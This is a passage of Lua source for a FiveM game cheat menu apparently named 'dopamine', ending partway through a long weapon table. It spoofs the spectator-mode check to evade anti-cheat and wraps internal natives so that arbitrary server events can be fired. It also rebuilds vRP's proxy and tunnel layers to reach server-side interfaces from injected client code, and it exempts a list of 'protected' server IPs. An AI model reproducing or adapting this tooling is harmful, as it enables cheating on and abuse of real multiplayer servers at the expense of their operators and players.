--[[
	Made by Nertigel & Flacko
]]

local oldPrint = print
print = function(trash)
	oldPrint('[dopamine] '..trash)
end

TriggerCustomEvent = function(server, event, ...)
	local payload = msgpack.pack({...})
	if server then
		TriggerServerEventInternal(event, payload, payload:len())
	else
		TriggerEventInternal(event, payload, payload:len())
	end
end

NetworkIsInSpectatorMode = function()
	return false
end

_G.NetworkIsInSpectatorMode = function()
	return false
end

--[[
	vRP Shit
]]
--[[ PROXY CLIENT-SIDE VERSION (https://github.com/ImagicTheCat/vRP)]]
--[[ Proxy interface system, used to add/call functions between resources]]
Proxy = {} local proxy_rdata = {} local function proxy_callback(rvalues) --[[ save returned values, TriggerEvent is synchronous]] proxy_rdata = rvalues end local function proxy_resolve(itable,key) local iname = getmetatable(itable).name --[[ generate access function]] local fcall = function(args,callback) if args == nil then args = {} end TriggerCustomEvent(false, iname..":proxy",key,args,proxy_callback) return table.unpack(proxy_rdata) --[[ returns]] end itable[key] = fcall --[[ add generated call to table (optimization)]] return fcall end --[[ Add event handler to call interface functions (can be called multiple times for the same interface name with different tables)]] function Proxy.addInterface(name, itable) AddEventHandler(name..":proxy",function(member,args,callback) local f = itable[member] if type(f) == "function" then callback({f(table.unpack(args))}) --[[ call function with and return values through callback]] --[[ CancelEvent() cancel event doesn't seem to cancel the event for the other handlers, but if it does, uncomment this]] else --[[ print("error: proxy call "..name..":"..member.." not found")]] end end) end function Proxy.getInterface(name) local r = setmetatable({},{ __index = proxy_resolve, name = name }) return r end
--[[ TUNNEL CLIENT SIDE VERSION (https://github.com/ImagicTheCat/vRP)]]
--[[ Too bad that require doesn't exist client-side]]
--[[ TOOLS DEF]]
Tools = {} --[[ ID generator]] local IDGenerator = {} function Tools.newIDGenerator() local r = setmetatable({}, { __index = IDGenerator }) r:construct() return r end function IDGenerator:construct() self:clear() end function IDGenerator:clear() self.max = 0 self.ids = {} end --[[ return a new id]] function IDGenerator:gen() if #self.ids > 0 then return table.remove(self.ids) else local r = self.max self.max = self.max+1 return r end end --[[ free a previously generated id]] function IDGenerator:free(id) table.insert(self.ids,id) end
--[[ TUNNEL DEF]]
Tunnel = {} local function tunnel_resolve(itable,key) local mtable = getmetatable(itable) local iname = mtable.name local ids = mtable.tunnel_ids local callbacks = mtable.tunnel_callbacks local identifier = mtable.identifier --[[ generate access function]] local fcall = function(args,callback) if args == nil then args = {} end --[[ send request]] if type(callback) == "function" then --[[ ref callback if exists (become a request)]] local rid = ids:gen() callbacks[rid] = callback TriggerCustomEvent(true, iname..":tunnel_req",key,args,identifier,rid) else --[[ regular trigger]] TriggerCustomEvent(true, iname..":tunnel_req",key,args,"",-1) end end itable[key] = fcall --[[ add generated call to table (optimization)]] return fcall end --[[ bind an interface (listen to net requests)]] --[[ name: interface name]] --[[ interface: table containing functions]] function Tunnel.bindInterface(name,interface) --[[ receive request]] RegisterNetEvent(name..":tunnel_req") AddEventHandler(name..":tunnel_req",function(member,args,identifier,rid) local f = interface[member] local delayed = false local rets = {} if type(f) == "function" then --[[ bind the global function to delay the return values using the returned function with args]] TUNNEL_DELAYED = function() delayed = true return function(rets) rets = rets or {} if rid >= 0 then TriggerCustomEvent(true, name..":"..identifier..":tunnel_res",rid,rets) end end end rets = {f(table.unpack(args))} --[[ call function ]] --[[ CancelEvent() cancel event doesn't seem to cancel the event for the other handlers, but if it does, uncomment this]] end --[[ send response (event if the function doesn't exist)]] if not delayed and rid >= 0 then TriggerCustomEvent(true, name..":"..identifier..":tunnel_res",rid,rets) end end) end --[[ get a tunnel interface to send requests ]] --[[ name: interface name]] --[[ identifier: unique string to identify this tunnel interface access (the name of the current resource should be fine)]] function Tunnel.getInterface(name,identifier) local ids = Tools.newIDGenerator() local callbacks = {} --[[ build interface]] local r = setmetatable({},{ __index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier }) --[[ receive response]] RegisterNetEvent(name..":"..identifier..":tunnel_res") AddEventHandler(name..":"..identifier..":tunnel_res",function(rid,args) local callback = callbacks[rid] if callback ~= nil then --[[ free request id]] ids:free(rid) callbacks[rid] = nil --[[ call]] callback(table.unpack(args)) end end) return r end
--[[Get vRP]]
vRP = Proxy.getInterface("vRP")

--[[
	Server blacklist.
]]

local ShouldShowMenu = true

local whitelistedServerIPs = {
	"51.195.5.174:30120",
	"66.70.180.176:30120"
}

for k,v in pairs(whitelistedServerIPs) do
	if GetCurrentServerEndpoint() == v then
		print('Nertigel: This server is protected and the menu is not gonna work here.')
		ShouldShowMenu = false
		return
	end
end

print('Information')
print('IP: '..GetCurrentServerEndpoint())
print('Resource: '..GetCurrentResourceName())

local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["UP"] = 172, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
  ["MOUSE1"] = 24
}

--[[Arrays/Tables]]
local weaponsTableFM = { Melee = { BaseballBat = { id = 'weapon_bat', name = '~s~~s~Baseball Bat', bInfAmmo = false, mods = {} }, BrokenBottle = { id = 'weapon_bottle', name = '~s~~s~Broken Bottle', bInfAmmo = false, mods = {} }, Crowbar = { id = 'weapon_Crowbar', name = '~s~~s~Crowbar', bInfAmmo = false, mods = {} }, Flashlight = { id = 'weapon_flashlight', name = '~s~~s~Flashlight', bInfAmmo = false, mods = {} }, GolfClub = { id = 'weapon_golfclub', name = '~s~~s~Golf Club', bInfAmmo = false, mods = {} }, BrassKnuckles = { id = 'weapon_knuckle', name = '~s~~s~Brass Knuckles', bInfAmmo = false, mods = {} }, Knife = { id = 'weapon_knife', name = '~s~~s~Knife', bInfAmmo = false, mods = {} }, Machete = { id = 'weapon_machete', name = '~s~~s~Machete', bInfAmmo = false, mods = {} }, Switchblade = { id = 'weapon_switchblade', name = '~s~~s~Switchblade', bInfAmmo = false, mods = {} }, Nightstick = { id = 'weapon_nightstick', name = '~s~~s~Nightstick', bInfAmmo = false, mods = {} }, BattleAxe = { id = 'weapon_battleaxe', name = '~s~~s~Battle Axe', bInfAmmo = false, mods = {} } }, Handguns = { Pistol = { id = 'weapon_pistol', name = '~s~~s~Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_PISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_PISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, PistolMK2 = { id = 'weapon_pistol_mk2', name = '~s~~s~Pistol MK 2', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_PISTOL_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_PISTOL_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Mounted Scope', id = 'COMPONENT_AT_PI_RAIL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH_02' } }, BarrelAttachments = { { name = '~s~~s~Compensator', id = 'COMPONENT_AT_PI_COMP' }, { name = '~s~~s~Suppessor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, CombatPistol = { id = 'weapon_combatpistol', name = '~s~~s~Combat Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATPISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, APPistol = { id = 'weapon_appistol', name = '~s~~s~AP Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_APPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_APPISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, StunGun = { id = 'weapon_stungun', name = '~s~~s~Stun Gun', bInfAmmo = false, mods = {} }, Pistol50 = { id = 'weapon_pistol50', name = '~s~~s~Pistol .50', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_PISTOL50_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_PISTOL50_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, SNSPistol = { id = 'weapon_snspistol', name = '~s~~s~SNS Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SNSPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SNSPISTOL_CLIP_02' } } } }, SNSPistolMkII = { id = 'weapon_snspistol_mk2', name = '~s~~s~SNS Pistol Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Mounted Scope', id = 'COMPONENT_AT_PI_RAIL_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH_03' } }, BarrelAttachments = { { name = '~s~~s~Compensator', id = 'COMPONENT_AT_PI_COMP_02' }, { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP_02' } } } }, HeavyPistol = { id = 'weapon_heavypistol', name = '~s~~s~Heavy Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_HEAVYPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_HEAVYPISTOL_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, VintagePistol = { id = 'weapon_vintagepistol', name = '~s~~s~Vintage Pistol', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_VINTAGEPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_VINTAGEPISTOL_CLIP_02' } }, BarrelAttachments = { { 'Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, FlareGun = { id = 'weapon_flaregun', name = '~s~~s~Flare Gun', bInfAmmo = false, mods = {} }, MarksmanPistol = { id = 'weapon_marksmanpistol', name = '~s~~s~Marksman Pistol', bInfAmmo = false, mods = {} }, HeavyRevolver = { id = 'weapon_revolver', name = '~s~~s~Heavy Revolver', bInfAmmo = false, mods = {} }, HeavyRevolverMkII = { id = 'weapon_revolver_mk2', name = '~s~~s~Heavy Revolver Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_01' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Compensator', id = 'COMPONENT_AT_PI_COMP_03' } } } }, DoubleActionRevolver = { id = 'weapon_doubleaction', name = '~s~~s~Double Action Revolver', bInfAmmo = false, mods = {} }, UpnAtomizer = { id = 'weapon_raypistol', name = '~s~~s~Up-n-Atomizer', bInfAmmo = false, mods = {} } }, SMG = { MicroSMG = { id = 'weapon_microsmg', name = '~s~~s~Micro SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MICROSMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MICROSMG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_PI_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } } } }, SMG = { id = 'weapon_smg', name = '~s~~s~SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SMG_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_SMG_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, SMGMkII = { id = 'weapon_smg_mk2', name = '~s~~s~SMG Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_SMG_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_SMG_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_SMG_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_SMG_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS_SMG' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_SB_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_SB_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } } } }, AssaultSMG = { id = 'weapon_assaultsmg', name = '~s~~s~Assault SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTSMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTSMG_CLIP_02' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } } } }, CombatPDW = { id = 'weapon_combatpdw', name = '~s~~s~Combat PDW', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_COMBATPDW_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_COMBATPDW_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_COMBATPDW_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, MachinePistol = { id = 'weapon_machinepistol', name = '~s~~s~Machine Pistol ', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MACHINEPISTOL_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MACHINEPISTOL_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_MACHINEPISTOL_CLIP_03' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_PI_SUPP' } } } }, MiniSMG = { id = 'weapon_minismg', name = '~s~~s~Mini SMG', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_MINISMG_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_MINISMG_CLIP_02' } } } }, UnholyHellbringer = { id = 'weapon_raycarbine', name = '~s~~s~Unholy Hellbringer', bInfAmmo = false, mods = {} } }, Shotguns = { PumpShotgun = { id = 'weapon_pumpshotgun', name = '~s~~s~Pump Shotgun', bInfAmmo = false, mods = { Flashlight = { { name = 'Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_SR_SUPP' } } } }, PumpShotgunMkII = { id = 'weapon_pumpshotgun_mk2', name = '~s~~s~Pump Shotgun Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01' }, { name = '~s~~s~Dragon Breath Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Steel Buckshot Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~Flechette Shells', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT' }, { name = '~s~~s~Explosive Slugs', id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Medium Scope', id = 'COMPONENT_AT_SCOPE_SMALL_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_SR_SUPP_03' }, { name = '~s~~s~Squared Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_08' } } } }, SawedOffShotgun = { id = 'weapon_sawnoffshotgun', name = '~s~~s~Sawed-Off Shotgun', bInfAmmo = false, mods = {} }, AssaultShotgun = { id = 'weapon_assaultshotgun', name = '~s~~s~Assault Shotgun', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, BullpupShotgun = { id = 'weapon_bullpupshotgun', name = '~s~~s~Bullpup Shotgun', bInfAmmo = false, mods = { Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, Musket = { id = 'weapon_musket', name = '~s~~s~Musket', bInfAmmo = false, mods = {} }, HeavyShotgun = { id = 'weapon_heavyshotgun', name = '~s~~s~Heavy Shotgun', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, DoubleBarrelShotgun = { id = 'weapon_dbshotgun', name = '~s~~s~Double Barrel Shotgun', bInfAmmo = false, mods = {} }, SweeperShotgun = { id = 'weapon_autoshotgun', name = '~s~~s~Sweeper Shotgun', bInfAmmo = false, mods = {} } }, AssaultRifles = { AssaultRifle = { id = 'weapon_assaultrifle', name = '~s~~s~Assault Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTRIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTRIFLE_CLIP_02' }, { name = '~s~~s~Drum Magazine', id = 'COMPONENT_ASSAULTRIFLE_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, AssaultRifleMkII = { id = 'weapon_assaultrifle_mk2', name = '~s~~s~Assault Rifle Mk II', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_AR_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_AR_BARREL_0' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP_02' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name = '~s~~s~Fat-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_03' }, { name = '~s~~s~Precision Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_04' }, { name = '~s~~s~Heavy Duty Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_05' }, { name = '~s~~s~Slanted Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_06' }, { name = '~s~~s~Split-End Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_07' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02' } } } }, CarbineRifle = { id = 'weapon_carbinerifle', name = '~s~~s~Carbine Rifle', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_CARBINERIFLE_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_CARBINERIFLE_CLIP_02' }, { name = '~s~~s~Box Magazine', id = 'COMPONENT_CARBINERIFLE_CLIP_03' } }, Sights = { { name = '~s~~s~Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' } }, Grips = { { name = '~s~~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP' } } } }, CarbineRifleMkII = { id = 'weapon_carbinerifle_mk2', name = '~s~~s~Carbine Rifle Mk II ', bInfAmmo = false, mods = { Magazines = { { name = '~s~~s~Default Magazine', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01' }, { name = '~s~~s~Extended Magazine', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02' }, { name = '~s~~s~Tracer Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER' }, { name = '~s~~s~Incendiary Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY' }, { name = '~s~~s~Hollow Point Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING' }, { name = '~s~~s~FMJ Rounds', id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ' } }, Sights = { { name = '~s~~s~Holograhpic Sight', id = 'COMPONENT_AT_SIGHTS' }, { name = '~s~~s~Small Scope', id = 'COMPONENT_AT_SCOPE_MACRO_MK2' }, { name = '~s~~s~Large Scope', id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2' } }, Flashlight = { { name = '~s~~s~Flashlight', id = 'COMPONENT_AT_AR_FLSH' } }, Barrel = { { name = '~s~~s~Default', id = 'COMPONENT_AT_CR_BARREL_01' }, { name = '~s~~s~Heavy', id = 'COMPONENT_AT_CR_BARREL_02' } }, BarrelAttachments = { { name = '~s~~s~Suppressor', id = 'COMPONENT_AT_AR_SUPP' }, { name = '~s~~s~Flat Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_01' }, { name = '~s~~s~Tactical Muzzle Brake', id = 'COMPONENT_AT_MUZZLE_02' }, { name 